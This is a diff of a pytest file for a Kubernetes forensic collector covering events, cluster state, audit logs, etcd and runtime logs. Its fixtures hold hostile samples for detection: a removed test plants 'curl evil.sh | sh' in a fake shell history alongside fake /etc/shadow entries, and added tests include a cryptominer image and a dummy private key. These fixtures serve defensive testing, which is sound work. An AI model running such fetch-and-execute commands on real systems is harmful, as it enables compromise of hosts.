@@ -7,6 +7,7 @@ cluster, kubeconfig, crictl, or journalctl is required.
 
 from __future__ import annotations
 
+import gzip
 import json
 from datetime import UTC, datetime
 from pathlib import Path
@@ -17,15 +18,11 @@ from collector.clouds.kubernetes.node import NodeAccess
 from collector.engine.api.kubernetes.api_plane.audit_posture import AuditPostureCollector
 from collector.engine.api.kubernetes.api_plane.cluster_state import ClusterStateCollector
 from collector.engine.api.kubernetes.api_plane.events import EventsCollector
-from collector.engine.api.kubernetes.api_plane.pod_logs import PodLogsCollector
 from collector.engine.api.kubernetes.api_plane.rbac import RbacCollector
 from collector.engine.api.kubernetes.node_plane.apiserver_audit import ApiserverAuditCollector
-from collector.engine.api.kubernetes.node_plane.checkpoint import CheckpointCollector
-from collector.engine.api.kubernetes.node_plane.container_fs import ContainerFsCollector
 from collector.engine.api.kubernetes.node_plane.container_logs import ContainerLogsCollector
-from collector.engine.api.kubernetes.node_plane.control_plane_logs import ControlPlaneLogsCollector
 from collector.engine.api.kubernetes.node_plane.etcd import EtcdCollector
-from collector.engine.api.kubernetes.node_plane.node_os import NodeOsCollector
+from collector.engine.api.kubernetes.node_plane.runtime_logs import RuntimeLogsCollector
 from collector.lib.base import assert_readonly
 from collector.lib.models import CollectionContext, GapReason, SourceStatus, TimeWindow
 
@@ -54,6 +51,47 @@ class FakeFactory:
 
     def read_pod_log(self, ns, pod, container, previous=False):
         return self.pod_logs.get((ns, pod, container, previous), "")
+
+    def cluster_version(self):
+        val = self.responses.get("cluster_version", {"gitVersion": "v1.30.2", "platform": "linux/amd64"})
+        if isinstance(val, Exception):
+            raise val
+        return dict(val)
+
+    def api_resources(self):
+        val = self.responses.get(
+            "api_resources",
+            {"group_versions": ["v1"], "groups": [], "resources": {"v1": []}, "errors": {}},
+        )
+        if isinstance(val, Exception):
+            raise val
+        return dict(val)
+
+
+def _fake_node(root: Path, commands=None, binaries=()):
+    """A NodeAccess whose external commands come from a table instead of the host.
+
+    ``commands`` maps a substring of the joined argv to ``(rc, stdout, stderr)``; anything
+    unmatched behaves like a missing binary. Node-plane collectors are exercised without a
+    real crictl / journalctl / etcdctl anywhere on the machine.
+    """
+    node = NodeAccess(root=root)
+    table = dict(commands or {})
+    allowed = set(binaries) | {args.split()[0] for args in table}
+
+    def have(binary):
+        return binary in allowed
+
+    def run(args, timeout=None):
+        joined = " ".join(args)
+        for key, value in table.items():
+            if key in joined:
+                return value
+        return -1, "", f"{args[0]}: not available on node"
+
+    node.have = have
+    node.run = run
+    return node
 
 
 def _ctx(tmp_path: Path, cf, *, window=None, params=None) -> CollectionContext:
@@ -211,23 +249,6 @@ def test_rbac_flags_cluster_admin_and_anonymous(tmp_path: Path) -> None:
     assert any(a["binding"] == "anon-binding" for a in anon)
 
 
-def test_pod_logs_reads_previous_and_current(tmp_path: Path) -> None:
-    pods = [{"metadata": {"namespace": "prod", "name": "web"}, "spec": {"containers": [{"name": "app"}]}}]
-    cf = FakeFactory(
-        responses={"list_pods": pods},
-        pod_logs={
-            ("prod", "web", "app", False): "line current\n",
-            ("prod", "web", "app", True): "line previous\n",
-        },
-    )
-    result = PodLogsCollector(_ctx(tmp_path, cf)).collect()
-    assert result.record_count == 2  # current + previous
-    assert result.status == SourceStatus.COLLECTED
-
-
-# --------------------------------------------------------------------------------------------
-# Node plane
-# --------------------------------------------------------------------------------------------
 def test_apiserver_audit_parses_and_detects(tmp_path: Path) -> None:
     root = _node_root(tmp_path)
     _write(
@@ -278,33 +299,6 @@ def test_container_logs_reads_from_node(tmp_path: Path) -> None:
     assert result.status == SourceStatus.COLLECTED
 
 
-def test_control_plane_flags_unexpected_manifest(tmp_path: Path) -> None:
-    root = _node_root(tmp_path)
-    _write(root, "/etc/kubernetes/manifests/kube-apiserver.yaml", "apiVersion: v1\n")
-    _write(root, "/etc/kubernetes/manifests/evil.yaml", "apiVersion: v1\nkind: Pod\n")
-    cf = FakeFactory(node=NodeAccess(root=root))
-    result = ControlPlaneLogsCollector(_ctx(tmp_path, cf)).collect()
-    assert any("evil.yaml" in g[2] for g in result.gaps)
-
-
-def test_node_os_captures_logs_and_shadow_metadata(tmp_path: Path) -> None:
-    root = _node_root(tmp_path)
-    _write(root, "/var/log/auth.log", "Jun 11 login\n")
-    _write(root, "/etc/passwd", "root:x:0:0:root:/root:/bin/bash\n")
-    _write(root, "/etc/shadow", "root:$6$hash:19000:0:99999:7:::\n")
-    cf = FakeFactory(node=NodeAccess(root=root))
-    result = NodeOsCollector(_ctx(tmp_path, cf)).collect()
-    assert result.status == SourceStatus.COLLECTED
-    config = json.loads(
-        (tmp_path / "staging" / "sources" / "k8s_node_os" / "config.json").read_text()
-    )
-    assert config["shadow"]["present"] is True
-    assert "root" in config["shadow"]["usernames"]
-    assert "sha256" in config["shadow"]  # hashed, not exposed
-    # The shadow password hash itself is never written to config.
-    assert "$6$hash" not in json.dumps(config)
-
-
 def test_etcd_posture_flags_disabled_cert_auth(tmp_path: Path) -> None:
     root = _node_root(tmp_path)
     _write(
@@ -321,38 +315,386 @@ def test_etcd_posture_flags_disabled_cert_auth(tmp_path: Path) -> None:
     assert "non-loopback" in joined
 
 
-def test_checkpoint_without_targets_is_skipped(tmp_path: Path) -> None:
-    cf = FakeFactory(node=NodeAccess(root=_node_root(tmp_path)))
-    result = CheckpointCollector(_ctx(tmp_path, cf)).collect()
-    assert result.status == SourceStatus.SKIPPED
 
 
-def test_container_fs_on_docker_runtime_is_not_supported(tmp_path: Path) -> None:
-    root = _node_root(tmp_path)
-    (root / "var/lib/docker").mkdir(parents=True)  # runtime detected as docker
-    cf = FakeFactory(node=NodeAccess(root=root))
-    params = {"k8s_container_fs": {"container_ids": ["abc"]}}
-    result = ContainerFsCollector(_ctx(tmp_path, cf, params=params)).collect()
-    assert result.status == SourceStatus.SKIPPED
-    assert result.gaps[0][1] == GapReason.NOT_SUPPORTED
 
+def test_events_merges_both_apis_and_dedupes_by_uid(tmp_path: Path) -> None:
+    core = [
+        {"metadata": {"uid": "u1"}, "reason": "OOMKilling"},
+        {"metadata": {"uid": "u2"}, "reason": "Scheduled"},
+    ]
+    modern = [
+        {"metadata": {"uid": "u2"}, "reason": "Scheduled"},  # same object, modern view
+        {"metadata": {"uid": "u3"}, "reason": "FailedMount"},
+    ]
+    cf = FakeFactory(responses={"list_events": core, "list_events_v1": modern})
+    result = EventsCollector(_ctx(tmp_path, cf)).collect()
 
-def test_container_fs_extracts_upperdir_and_hashes(tmp_path: Path) -> None:
-    root = _node_root(tmp_path)
-    (root / "var/lib/containerd").mkdir(parents=True)  # containerd runtime
-    upper = "/var/lib/containerd/io.containerd.snapshotter/1/fs"
-    _write(root, f"{upper}/tmp/miner", "malware")
-    _write(root, f"{upper}/root/.bash_history", "curl evil.sh | sh\n")
-    cf = FakeFactory(node=NodeAccess(root=root))
-    params = {"k8s_container_fs": {"container_upperdirs": [upper]}}
-    result = ContainerFsCollector(_ctx(tmp_path, cf, params=params)).collect()
-    assert result.status == SourceStatus.COLLECTED
+    assert result.record_count == 3  # u1, u2 (once), u3
     config = json.loads(
-        (tmp_path / "staging" / "sources" / "k8s_container_fs" / "config.json").read_text()
+        (tmp_path / "staging" / "sources" / "k8s_events" / "config.json").read_text()
     )
-    kinds = {m["kind"] for m in config["manifest"]}
-    assert "shell_history" in kinds and "changed_file" in kinds
-    assert all(m.get("sha256") for m in config["manifest"])
+    assert config["deduplicated"] == 1
+    assert config["apis"]["core/v1"]["events"] == 2
+    assert config["apis"]["events.k8s.io/v1"]["events"] == 2
+
+
+def test_events_denied_on_one_api_still_collects_the_other(tmp_path: Path) -> None:
+    cf = FakeFactory(
+        responses={
+            "list_events": KubeAccessDenied("list events", "forbidden"),
+            "list_events_v1": [{"metadata": {"uid": "u9"}, "reason": "BackOff"}],
+        }
+    )
+    result = EventsCollector(_ctx(tmp_path, cf)).collect()
+    assert result.record_count == 1
+    assert result.status == SourceStatus.PARTIAL
+    assert any(g[1] == GapReason.ACCESS_DENIED and "core/v1" in g[2] for g in result.gaps)
+
+
+# --------------------------------------------------------------------------------------------
+# Pod logs — admission webhook targeting
+# --------------------------------------------------------------------------------------------
+def test_cluster_state_captures_environment_snapshot(tmp_path: Path) -> None:
+    pods = [
+        {
+            "metadata": {"namespace": "prod", "name": "web"},
+            "spec": {"containers": [{"name": "app", "image": "registry.k8s.io/pause:3.9"}]},
+            "status": {"container_statuses": [{"name": "app", "image_id": "sha256:aaa"}]},
+        },
+        {
+            "metadata": {"namespace": "prod", "name": "miner"},
+            "spec": {"containers": [{"name": "c", "image": "docker.io/evil/xmrig:latest"}]},
+            "status": {"container_statuses": [{"name": "c", "image_id": "sha256:bbb"}]},
+        },
+    ]
+    namespaces = [
+        {"metadata": {"name": "prod", "labels": {"pod-security.kubernetes.io/enforce": "baseline"}}},
+        {"metadata": {"name": "loose", "labels": {"pod-security.kubernetes.io/enforce": "privileged"}}},
+        {"metadata": {"name": "bare", "labels": {}}},
+    ]
+    pvs = [
+        {"metadata": {"name": "pv-host"}, "spec": {"host_path": {"path": "/mnt/data"}}},
+        {"metadata": {"name": "pv-nfs"}, "spec": {"nfs": {"path": "/exports"}}},
+    ]
+    cf = FakeFactory(
+        responses={"list_pods": pods, "list_namespaces": namespaces, "list_persistent_volumes": pvs}
+    )
+    result = ClusterStateCollector(_ctx(tmp_path, cf)).collect()
+    src = tmp_path / "staging" / "sources" / "k8s_cluster_state"
+
+    images = json.loads((src / "images.json").read_text())
+    assert {i["image"] for i in images["images"]} == {
+        "registry.k8s.io/pause:3.9",
+        "docker.io/evil/xmrig:latest",
+    }
+    assert [i["imageID"] for i in images["images"] if i["image"].endswith("pause:3.9")] == ["sha256:aaa"]
+    assert [i["image"] for i in images["untrusted"]] == ["docker.io/evil/xmrig:latest"]
+
+    env = json.loads((src / "environment.json").read_text())
+    assert env["cluster"]["determined"] is True
+    assert env["cluster"]["gitVersion"] == "v1.30.2"
+    assert env["discovery"]["determined"] is True
+
+    security = json.loads((src / "pod_security.json").read_text())
+    assert security["privileged_namespaces"] == ["loose"]
+    assert security["unlabelled_namespaces"] == ["bare"]
+
+    hostpath = json.loads((src / "hostpath_volumes.json").read_text())
+    assert [p["name"] for p in hostpath] == ["pv-host"]
+    assert any("hostPath-backed" in g[2] for g in result.gaps)
+    assert any("privileged' Pod Security" in g[2] for g in result.gaps)
+
+
+def test_cluster_state_never_writes_secret_values(tmp_path: Path) -> None:
+    # The factory's list_secrets_metadata is what strips payloads; the collector must not
+    # reintroduce them, so assert on everything the collector actually wrote.
+    secrets = [
+        {
+            "metadata": {"namespace": "prod", "name": "db", "uid": "s1"},
+            "type": "Opaque",
+        }
+    ]
+    cf = FakeFactory(responses={"list_secrets_metadata": secrets})
+    ClusterStateCollector(_ctx(tmp_path, cf)).collect()
+
+    src = tmp_path / "staging" / "sources" / "k8s_cluster_state"
+    blob = b""
+    for path in sorted(src.rglob("*")):
+        if path.is_file():
+            blob += path.read_bytes() if path.suffix != ".gz" else gzip.decompress(path.read_bytes())
+    assert b'"data"' not in blob
+    assert b"stringData" not in blob and b"string_data" not in blob
+    assert b'"db"' in blob  # the metadata itself is present
+
+
+# --------------------------------------------------------------------------------------------
+# API-server audit — path fallbacks and webhook backends
+# --------------------------------------------------------------------------------------------
+def test_apiserver_audit_uses_default_path_fallback(tmp_path: Path) -> None:
+    root = _node_root(tmp_path)
+    # No apiserver manifest at all; the log sits at the documented fallback location.
+    _write(
+        root,
+        "/var/log/kube-apiserver-audit.log",
+        json.dumps({"kind": "Event", "verb": "get", "objectRef": {"resource": "secrets"}}) + "\n",
+    )
+    cf = FakeFactory(node=NodeAccess(root=root))
+    result = ApiserverAuditCollector(_ctx(tmp_path, cf)).collect()
+    assert result.record_count == 1
+    config = json.loads(
+        (tmp_path / "staging" / "sources" / "k8s_apiserver_audit" / "config.json").read_text()
+    )
+    assert config["files"] == ["/var/log/kube-apiserver-audit.log"]
+
+
+def test_apiserver_audit_reads_gzipped_rotated_siblings(tmp_path: Path) -> None:
+    root = _node_root(tmp_path)
+    _write(
+        root,
+        "/etc/kubernetes/manifests/kube-apiserver.yaml",
+        "    - --audit-log-path=/var/log/kubernetes/audit/audit.log\n",
+    )
+    _write(
+        root,
+        "/var/log/kubernetes/audit/audit.log",
+        json.dumps({"kind": "Event", "verb": "create", "objectRef": {"resource": "pods"}}) + "\n",
+    )
+    rotated = root / "var/log/kubernetes/audit/audit-2026-09-01T00-00-00.123.log.gz"
+    rotated.write_bytes(
+        gzip.compress(
+            (
+                json.dumps(
+                    {
+                        "kind": "Event",
+                        "verb": "create",
+                        "objectRef": {"resource": "pods", "subresource": "exec"},
+                    }
+                )
+                + "\n"
+            ).encode()
+        )
+    )
+    cf = FakeFactory(node=NodeAccess(root=root))
+    result = ApiserverAuditCollector(_ctx(tmp_path, cf)).collect()
+    assert result.record_count == 2
+    dets = json.loads(
+        (tmp_path / "staging" / "sources" / "k8s_apiserver_audit" / "detections.json").read_text()
+    )
+    assert len(dets["exec_or_attach"]) == 1
+
+
+def test_apiserver_audit_webhook_only_backend_is_not_present_not_disabled(tmp_path: Path) -> None:
+    root = _node_root(tmp_path)
+    _write(
+        root,
+        "/etc/kubernetes/manifests/kube-apiserver.yaml",
+        "    - --audit-webhook-config-file=/etc/kubernetes/audit-webhook.yaml\n",
+    )
+    cf = FakeFactory(node=NodeAccess(root=root))
+    result = ApiserverAuditCollector(_ctx(tmp_path, cf)).collect()
+    assert result.status == SourceStatus.EMPTY
+    assert result.gaps[0][1] == GapReason.NOT_PRESENT
+    assert "webhook" in result.gaps[0][2].lower()
+    assert "k8s_audit_posture" in result.gaps[0][2]
+
+
+def test_audit_posture_webhook_only_is_enabled_but_gapped(tmp_path: Path) -> None:
+    root = _node_root(tmp_path)
+    _write(
+        root,
+        "/etc/kubernetes/manifests/kube-apiserver.yaml",
+        "    - --audit-webhook-config-file=/etc/kubernetes/audit-webhook.yaml\n"
+        "    - --audit-policy-file=/etc/kubernetes/audit-policy.yaml\n",
+    )
+    _write(
+        root,
+        "/etc/kubernetes/audit-policy.yaml",
+        "rules:\n- level: RequestResponse\n  resources:\n  - group: ''\n"
+        "    resources: ['secrets','pods/exec']\n",
+    )
+    cf = FakeFactory(node=NodeAccess(root=root))
+    result = AuditPostureCollector(_ctx(tmp_path, cf)).collect()
+    config = json.loads(
+        (tmp_path / "staging" / "sources" / "k8s_audit_posture" / "config.json").read_text()
+    )
+    assert config["audit_enabled"] is True
+    assert config["log_backend"] is False
+    # Enabled, so NOT the critical "disabled" gap — but the file is off-node, which is a gap.
+    assert not any(g[1] == GapReason.LOGGING_NOT_CONFIGURED for g in result.gaps)
+    assert any(g[1] == GapReason.NOT_PRESENT and "WEBHOOK" in g[2] for g in result.gaps)
+
+
+def test_audit_posture_flags_short_retention(tmp_path: Path) -> None:
+    root = _node_root(tmp_path)
+    _write(
+        root,
+        "/etc/kubernetes/manifests/kube-apiserver.yaml",
+        "    - --audit-log-path=/var/log/kubernetes/audit/audit.log\n"
+        "    - --audit-policy-file=/etc/kubernetes/audit-policy.yaml\n"
+        "    - --audit-log-maxage=2\n"
+        "    - --audit-log-maxbackup=1\n",
+    )
+    _write(
+        root,
+        "/etc/kubernetes/audit-policy.yaml",
+        "rules:\n- level: RequestResponse\n  resources:\n  - group: ''\n"
+        "    resources: ['secrets','pods/exec']\n",
+    )
+    cf = FakeFactory(node=NodeAccess(root=root))
+    result = AuditPostureCollector(_ctx(tmp_path, cf)).collect()
+    joined = " ".join(g[2] for g in result.gaps)
+    assert "--audit-log-maxage=2" in joined
+    assert "--audit-log-maxbackup=1" in joined
+
+
+# --------------------------------------------------------------------------------------------
+# Control-plane logs — journal and crictl fallbacks
+# --------------------------------------------------------------------------------------------
+def test_etcd_inventories_pki_without_copying_private_keys(tmp_path: Path) -> None:
+    root = _node_root(tmp_path)
+    _write(
+        root,
+        "/etc/kubernetes/manifests/etcd.yaml",
+        "    - --client-cert-auth=true\n"
+        "    - --listen-client-urls=https://127.0.0.1:2379\n"
+        "    - --cert-file=/etc/kubernetes/pki/etcd/server.crt\n"
+        "    - --trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt\n",
+    )
+    _write(root, "/etc/kubernetes/pki/etcd/server.crt", "-----BEGIN CERTIFICATE-----\n")
+    _write(root, "/etc/kubernetes/pki/etcd/server.key", "-----BEGIN PRIVATE KEY-----\nSECRETKEY\n")
+    cf = FakeFactory(node=NodeAccess(root=root))
+    EtcdCollector(_ctx(tmp_path, cf)).collect()
+
+    src = tmp_path / "staging" / "sources" / "k8s_etcd"
+    config = json.loads((src / "config.json").read_text())
+    by_path = {f["path"]: f for f in config["tls_material"]["files"]}
+    key = by_path["/etc/kubernetes/pki/etcd/server.key"]
+    crt = by_path["/etc/kubernetes/pki/etcd/server.crt"]
+    assert key["captured"] is False and key["sha256"]
+    assert crt["captured"] is True and crt["sha256"]
+    assert not (src / "pki" / "server.key").exists()
+    assert (src / "pki" / "server.crt").exists()
+    # The key material itself never lands in the evidence tree.
+    blob = b"".join(p.read_bytes() for p in src.rglob("*") if p.is_file())
+    assert b"SECRETKEY" not in blob
+
+
+def test_etcd_flags_missing_encryption_at_rest_and_reports_data_dir(tmp_path: Path) -> None:
+    root = _node_root(tmp_path)
+    _write(
+        root,
+        "/etc/kubernetes/manifests/etcd.yaml",
+        "    - --client-cert-auth=true\n"
+        "    - --listen-client-urls=https://127.0.0.1:2379\n"
+        "    - --cert-file=/etc/kubernetes/pki/etcd/server.crt\n"
+        "    - --trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt\n",
+    )
+    # kube-apiserver present but with no --encryption-provider-config.
+    _write(root, "/etc/kubernetes/manifests/kube-apiserver.yaml", "    - --advertise-address=10.0.0.1\n")
+    _write(root, "/var/lib/etcd/member/snap/db", "x" * 64)
+    cf = FakeFactory(node=NodeAccess(root=root))
+    result = EtcdCollector(_ctx(tmp_path, cf)).collect()
+
+    assert any("encryption-at-rest is NOT configured" in g[2] for g in result.gaps)
+    config = json.loads((tmp_path / "staging" / "sources" / "k8s_etcd" / "config.json").read_text())
+    assert config["data_dir"]["present"] is True
+    assert config["data_dir"]["total_bytes"] == 64
+    # The DB itself is never captured.
+    assert not (tmp_path / "staging" / "sources" / "k8s_etcd" / "etcd-snapshot.db").exists()
+
+
+def test_etcd_collects_topology_and_flags_unhealthy_endpoint(tmp_path: Path) -> None:
+    root = _node_root(tmp_path)
+    _write(
+        root,
+        "/etc/kubernetes/manifests/etcd.yaml",
+        "    - --client-cert-auth=true\n"
+        "    - --listen-client-urls=https://127.0.0.1:2379\n"
+        "    - --cert-file=/etc/kubernetes/pki/etcd/server.crt\n"
+        "    - --trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt\n",
+    )
+    node = _fake_node(
+        root,
+        commands={
+            "etcdctl member list": (0, json.dumps({"members": [{"name": "cp1"}, {"name": "cp2"}]}), ""),
+            "etcdctl endpoint health": (
+                0,
+                json.dumps([
+                    {"endpoint": "https://127.0.0.1:2379", "health": True},
+                    {"endpoint": "https://10.0.0.9:2379", "health": False},
+                ]),
+                "",
+            ),
+        },
+    )
+    cf = FakeFactory(node=node)
+    result = EtcdCollector(_ctx(tmp_path, cf)).collect()
+    config = json.loads((tmp_path / "staging" / "sources" / "k8s_etcd" / "config.json").read_text())
+    assert config["topology"]["member_count"] == 2
+    assert config["topology"]["unhealthy_endpoints"] == ["https://10.0.0.9:2379"]
+    assert any("unhealthy" in g[2] for g in result.gaps)
+
+
+# --------------------------------------------------------------------------------------------
+# Runtime logs / container logs
+# --------------------------------------------------------------------------------------------
+def test_runtime_logs_inspects_each_container(tmp_path: Path) -> None:
+    root = _node_root(tmp_path)
+    (root / "var/lib/containerd").mkdir(parents=True)
+    containers = {
+        "containers": [
+            {
+                "id": "cid1",
+                "labels": {
+                    "io.kubernetes.pod.name": "web",
+                    "io.kubernetes.pod.namespace": "prod",
+                    "io.kubernetes.container.name": "app",
+                },
+            }
+        ]
+    }
+    node = _fake_node(
+        root,
+        commands={
+            "crictl ps -a -o json": (0, json.dumps(containers), ""),
+            "crictl images": (0, json.dumps({"images": []}), ""),
+            "crictl pods": (0, json.dumps({"items": []}), ""),
+            "crictl inspect cid1": (0, json.dumps({"status": {"id": "cid1"}}), ""),
+            "crictl version": (0, "RuntimeVersion: v1.7.0\n", ""),
+        },
+    )
+    cf = FakeFactory(node=node)
+    result = RuntimeLogsCollector(_ctx(tmp_path, cf)).collect()
+
+    src = tmp_path / "staging" / "sources" / "k8s_runtime_logs"
+    config = json.loads((src / "config.json").read_text())
+    assert config["containers_inspected"] == 1
+    rows = [
+        json.loads(line)
+        for line in gzip.decompress((src / "container_inspect.jsonl.gz").read_bytes())
+        .decode()
+        .splitlines()
+    ]
+    assert rows[0]["container_id"] == "cid1"
+    assert rows[0]["namespace"] == "prod"
+    assert rows[0]["inspect"]["status"]["id"] == "cid1"
+    assert rows[0]["_ventra_runtime"] == "containerd"  # NodeContext stamped
+    assert result.status in (SourceStatus.COLLECTED, SourceStatus.PARTIAL)
+
+
+def test_container_logs_collects_rotated_siblings(tmp_path: Path) -> None:
+    root = _node_root(tmp_path)
+    _write(root, "/var/log/pods/prod_web_uid123/app/0.log", "current\n")
+    _write(root, "/var/log/pods/prod_web_uid123/app/0.log.20260101-120000", "rotated\n")
+    cf = FakeFactory(node=NodeAccess(root=root))
+    result = ContainerLogsCollector(_ctx(tmp_path, cf)).collect()
+    assert result.record_count == 2
+    config = json.loads(
+        (tmp_path / "staging" / "sources" / "k8s_container_logs" / "config.json").read_text()
+    )
+    assert config["rotated_logs"] == 1
+    assert {e["namespace"] for e in config["logs"]} == {"prod"}
 
 
 # --------------------------------------------------------------------------------------------
